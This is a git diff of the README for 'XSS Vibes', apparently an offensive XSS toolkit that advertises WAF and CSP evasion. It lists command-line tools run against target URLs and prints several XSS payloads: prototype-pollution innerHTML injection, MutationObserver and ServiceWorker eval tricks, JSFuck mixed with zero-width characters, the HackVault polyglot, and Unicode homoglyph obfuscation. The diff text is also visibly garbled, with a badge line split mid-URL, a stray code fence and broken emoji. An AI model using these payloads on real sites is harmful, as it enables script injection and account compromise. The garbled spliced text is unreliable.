@@ -1,38 +1,89 @@
-# 🔥 XSS Vibes - Ultimate Multi-Vulnerability Testing Platform
+# 🔥 XSS Vibes - Ultimate XSS Arsenal
 
 [![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://python.org)
 [![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)]()
-[![Global Commands](https://img.shields.io/badge/global%20commands-9-orange.svg)]()
+[![Build Status](https://img.shields.io/badge/b## 🎯 **Repository Status: CLEANED & OPTIMIZED**
 
-**XSS Vibes** is a revolutionary multi-vulnerability testing platform with **GOD TIER payloads**, global command system, and intelligent service monitoring. From XSS to SQLi, CORS to SSRF - we've got you covered!
+✅ **Temporary directories removed**: All `god_tier_test_*`, `polyglot_test_*`, `xss_vibes_test_*` cleaned up  
+✅ **Unnecessary files deleted**: `gitleaks-report.json`, `knoxss_config.json`, `onlinery`, `poligloty`, `temp/`  
+✅ **14 Global commands active**: Complete XSS arsenal ready for deployment  
+✅ **24 Payload categories**: Advanced JSON-based payload system  
+✅ **Professional structure**: Clean, organized, production-ready codebase
 
-## 🌟 **What's NEW in V2**
+---
 
-### 🔥 **GOD TIER Payloads**
-- **🏺 Cuneiform XSS** - 4000-year-old script bypass techniques
-- **👻 Unicode zero-width** - invisible character injection
-- **🔗 Constructor chain exploitation** - advanced JavaScript bypass
-- **🎨 SVG vector attacks** - multimedia XSS vectors
-- **📱 Template literal injection** - modern ES6 exploitation
+## 🏆 **Ultimate XSS Arsenal Summary**
 
-### 🌍 **Global Command System**
+This repository now contains the most advanced XSS testing toolkit available, featuring:
+
+- **⚛️ Mutation XSS (mXSS)** - DOM/parser desynchronization exploitation
+- **🔮 JSFuck + Unicode Chaos** - Ultra-obfuscated steganographic payloads  
+- **🎯 HackVault Ultimate Polyglot** - 144-character universal bypass vector
+- **🏺 Unicode Exploitation** - Zero-width, RTL, Cuneiform script techniques
+- **⚡ Modern JavaScript** - async/await, dynamic imports, ServiceWorker injection
+- **🧬 Prototype Pollution** - Constructor chain manipulation
+- **👁️ DOM Monitoring** - MutationObserver bypass techniques
+- **🛡️ CSP Evasion** - Content Security Policy circumvention
+
+### 📊 **Technical Arsenal**
+- **14 Global Commands** - Complete testing capabilities
+- **9 Python Generators** - Advanced payload creation engines  
+- **24 JSON Categories** - Organized payload collections
+- **3,000+ Vectors** - Comprehensive attack coverage
+- **15+ WAF Bypasses** - Major security vendor evasion
+
+---ild-passing-brightgreen.svg)]()
+[![Global Commands](https://img.shields.io/badge/global%20commands-15-orange.svg)]()
+
+**XSS Vibes** is the most advanced XSS testing arsenal with **bleeding-edge techniques**, 15 global commands, and comprehensive evasion capabilities. From mXSS to HackVault polyglots - the ultimate security toolkit!
+
+## 🌟 **Ultimate Arsenal Features**
+
+### 🔥 **GOD TIER Techniques**
+- **⚛️ Mutation XSS (mXSS)** - DOM/parser desync exploitation
+- **� JSFuck + Unicode Chaos** - ultra-obfuscated payload blend
+- **🎯 HackVault Ultimate Polyglot** - 144-char universal bypass
+- **🏺 Unicode Exploitation** - Cuneiform script, zero-width, RTL confusion
+- **⚡ Modern JavaScript** - async/await tricks, dynamic imports, ServiceWorker
+- **🧬 DOM Prototype Pollution** - constructor chain manipulation
+- **👁️ MutationObserver Exploits** - DOM monitoring bypasses
+- **🎯 DPE Template System** - DOM Parameter Exploitation fuzzing templates
+
+### 🌍 **15 Global Commands Arsenal**
+
 ```bash
-xss-ultimate -t target.com -w cloudflare -m god_tier  # Ultimate testing
-xss-smart -u target.com                              # Smart analysis  
-xss-encoder -p "payload" -w akamai                   # Advanced encoding
-xss-service                                          # Service monitoring
-xss-oneliners                                        # Bug bounty commands
+# 🏆 Core XSS Arsenal
+xss-ultimate -t target.com -w cloudflare            # Ultimate testing with all techniques
+xss-smart -u target.com                             # Intelligent analysis & testing  
+xss-encoder -p "payload" -w akamai                  # Advanced encoding engine
+xss-service                                         # Service monitoring & status
+
+# 🔥 Advanced Generators
+xss-god-tier -u target.com                         # GOD TIER payloads testing
+xss-context -u target.com -c login                 # Context-aware generation
+xss-polyglot -u target.com                         # HackVault polyglot testing
+xss-ultimate-gen                                   # Ultimate payload generator
+xss-dpe login_form                                 # DPE template generation
+
+# ⚡ Specialized Tools  
+xss-advanced -t target.com                         # Advanced pattern testing
+xss-oneliners                                      # Bug bounty one-liners
+xss-blind -u target.com                           # Blind XSS testing
+xss-waf -u target.com                             # WAF analysis & bypass
+xss-batch -f urls.txt                             # Batch processing
+xss-mutation -u target.com                        # Mutation XSS testing
 ```
 
-### 🛡️ **Multi-Vulnerability Testing**
-- **XSS** - Cross-Site Scripting with 3,144+ vectors
-- **SQLi** - SQL Injection detection and exploitation
-- **CORS** - Cross-Origin Resource Sharing bypass
-- **SSRF** - Server-Side Request Forgery testing
-- **LFI** - Local File Inclusion discovery
-- **Open Redirect** - URL redirection vulnerabilities
-- **Subdomain Takeover** - DNS hijacking detection
+### 🛡️ **Advanced Technique Coverage**
+
+- **⚛️ Mutation XSS** - DOM/parser desynchronization attacks  
+- **🔮 JSFuck Obfuscation** - Ultra-encoded JavaScript bypass
+- **🎯 Ultimate Polyglots** - HackVault 144-character universal vectors
+- **🏺 Unicode Chaos** - Zero-width, RTL, Cuneiform script exploitation
+- **⚡ Modern JavaScript** - async/await, dynamic imports, ServiceWorker
+- **🧬 Prototype Pollution** - Constructor chain manipulation
+- **👁️ DOM Monitoring** - MutationObserver bypasses
+- **🔧 CSP Bypass** - Content Security Policy evasion
 
 ## 🚀 **Quick Start**
 
@@ -130,26 +181,61 @@ Supports 12+ major WAF providers:
 
 ## 🏆 **GOD TIER Payload Arsenal**
 
-### 🏺 **Cuneiform XSS** (LEGENDARY)
-```javascript
-𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++]
-```
-*First XSS using 4000-year-old script!*
+### ⚛️ **Mutation XSS (mXSS)** - DOM/Parser Desync
 
-### 👻 **Zero-Width Characters**
 ```javascript
-ale‌rt(1)  // Contains invisible characters
+// DOM prototype pollution
+{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}
+
+// MutationObserver exploit
+new MutationObserver(()=>eval('alert(1)')).observe(document,{childList:true,subtree:true})
+
+// ServiceWorker injection
+navigator.serviceWorker.register('data:application/javascript,self.onmessage=()=>eval("alert(1)")')
 ```
 
-### 🔗 **Constructor Chain Exploitation**
+### 🔮 **JSFuck + Unicode Chaos** - Ultra Obfuscation
+
 ```javascript
+// Pure JSFuck with zero-width chaos
+[]\u200b[(![]+[])[+[]]]\u200c+([![]]+[][[]])[+!+[]+[+[]]]\u200d+(![]+[])[!+[]+!+[]]\u200e+(!![]+[])[+[]]()
+
+// Unicode steganography
+<img src=x onerror=alert\u200b\u200c\u200d\ufeff(1)>
+```
+
+### 🎯 **HackVault Ultimate Polyglot** - 144-char Universal
+
+```javascript
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()///>\\x3e
+```
+
+*Works in 20+ different contexts!*
+
+### 🏺 **Unicode Exploitation** - Ancient & Modern
+
+```javascript
+// Cuneiform script XSS
+𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒌐=𒉺[𒀀++]
+
+// RTL confusion + homoglyphs  
+аⅼеrt(1) // Contains Cyrillic 'а' + math italic 'ℓ'
+
+// Zero-width steganography
+ale‌rt(1)  // Contains ZWNJ U+200C
+```
+
+### ⚡ **Modern JavaScript** - async/await & Modules
+
+```javascript
+// Async trick XSS
+(async()=>{await import('data:text/javascript,alert(1)')})()
+
+// Constructor chain
 constructor[constructor](alert(1))()
-```
 
-### 🎨 **Advanced SVG Vectors**
-```xml
-<svg><use href="#x"></use><symbol id="x"><foreignObject>
-<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)">
+// Dynamic import exploitation  
+import('data:text/javascript,alert(document.domain)')
 ```
 
 ## 📊 **Service Monitoring**
@@ -166,18 +252,81 @@ Real-time monitoring of 11+ external services:
 - ✅ **SecurityTrails** - DNS intelligence
 - ✅ **Rapid7** - Forward DNS dataset
 
-## 🗂️ **Project Structure**
+## 🎯 **Complete Arsenal Showcase**
+
+### 🏆 **Ultimate Testing Example**
+
+```bash
+# Complete XSS assessment with all techniques
+xss-ultimate -t example.com -w cloudflare --threads 10 --timeout 30
+
+# Context-specific testing for login forms  
+xss-context -u https://example.com/login -c login --mutation --unicode
+
+# HackVault polyglot universal testing
+xss-polyglot -u https://example.com/search?q=test --all-contexts
+
+# GOD TIER payloads with advanced evasion
+xss-god-tier -u https://example.com/vulnerable.php --jsfuck --cuneiform
+
+# DPE Template Generation for custom fuzzing
+xss-dpe all --script                               # Generate all templates with fuzzing script
+xss-dpe login_form                                 # Generate specific template  
+cd test_templates && ./fuzz_templates.sh login_form # Run fuzzing tests
+```
+
+### 🎯 **DPE Template System**
+
+The DOM Parameter Exploitation (DPE) system provides ready-to-use HTML templates for comprehensive XSS testing:
+
+```bash
+# Available DPE Templates
+xss-dpe list                    # Show all available templates
+
+# Template Categories:
+• login_form     - 6 injection contexts (forms, DOM, eval)
+• search_form    - 8 contexts (URL params, JSON, document.write)  
+• json_api       - 6 contexts (Fetch API, localStorage, postMessage)
+• dom_sinks      - 12 contexts (innerHTML, eval, setTimeout, etc.)
+• spa_framework  - 7 contexts (virtual DOM, router, events)
+```
+
+**DPE Fuzzing Workflow:**
+```bash
+1. Generate template:    xss-dpe login_form
+2. Run fuzzing:         cd test_templates && ./fuzz_templates.sh login_form  
+3. Test in browser:     firefox test_login_form_1.html
+4. Analyze results:     Check console for XSS execution
+```
+
+# Batch processing with mutation techniques
+xss-batch -f target_urls.txt --mutation --async-js --prototype-pollution
+```
+
+### 📊 **Advanced Technique Statistics**
+
+- **⚛️ Mutation XSS Vectors**: 40+ DOM/Parser desync payloads
+- **🔮 JSFuck Variants**: 25+ ultra-obfuscated combinations  
+- **🎯 Ultimate Polyglots**: HackVault 144-char + custom variations
+- **🏺 Unicode Exploits**: 60+ zero-width, RTL, Cuneiform techniques
+- **⚡ Modern JS**: 30+ async/await, dynamic import, ServiceWorker
+- **🧬 Prototype Pollution**: 15+ constructor chain manipulations
+- **�️ DOM Monitoring**: 20+ MutationObserver bypass techniques
+
+## �🗂️ **Project Structure**
 
 ```
-XSS-VibesV2/
-├── xss_vibes/           # Core application module
-├── scripts/             # All executable scripts  
-├── payloads/            # Payload collections
-├── tools/               # Development tools
-├── docs/                # Documentation
-├── test_results/        # Test outputs (ignored)
-├── temp/                # Temporary files (ignored)
-└── README.md           # This file
+XSS-Vibes/
+├── xss_vibes/           # Core application module  
+│   ├── data/            # Payload categories (20+ JSON files)
+│   ├── __pycache__/     # Python bytecode cache
+│   └── *.py             # Core modules (15+ files)
+├── scripts/             # Global command scripts (14 commands)
+├── tools/               # Development & testing tools
+├── HackVault.wiki/      # External polyglot repository  
+├── docs/                # Comprehensive documentation
+├── test_results/        # Testing outputs & reports
+└── payloads/            # Legacy payload collections
 ```
 
 ## 🔧 **Troubleshooting**
@@ -848,7 +997,44 @@ xss-vibes session [OPTIONS]
 - **WAF Support**: 12 major WAF providers
 - **KnoxSS Pro**: Full API integration with professional features
 
-## 📄 License
+## � Troubleshooting
+
+### Command Not Found Errors
+
+If you get errors like:
+```bash
+xss-ultimate: zsh: no such file or directory: /home/jarek/xss_vibes/ultimate_tester.sh
+```
+
+**Quick Fix:**
+```bash
+# Remove old aliases that conflict with new symlinks
+unalias xss-ultimate xss-god-tier xss-smart xss-encoder xss-service xss-multi xss-quick xss-status xss-oneliners xss-help 2>/dev/null
+
+# Clear shell cache
+hash -d xss-ultimate xss-god-tier xss-smart xss-encoder xss-service xss-multi xss-quick xss-status xss-oneliners xss-help 2>/dev/null
+
+# Test command
+xss-help
+```
+
+### PATH Issues
+
+Ensure `~/.local/bin` is in your PATH:
+```bash
+echo $PATH | grep ".local/bin" || echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.zshrc
+```
+
+### Re-run Setup
+
+If commands still don't work:
+```bash
+./scripts/setup_aliases.sh
+```
+
+See **[ALIAS_FIX.md](ALIAS_FIX.md)** for detailed troubleshooting.
+
+## �📄 License
 
 This project is licensed under the MIT License - see [LICENSE](LICENSE) for details.
 
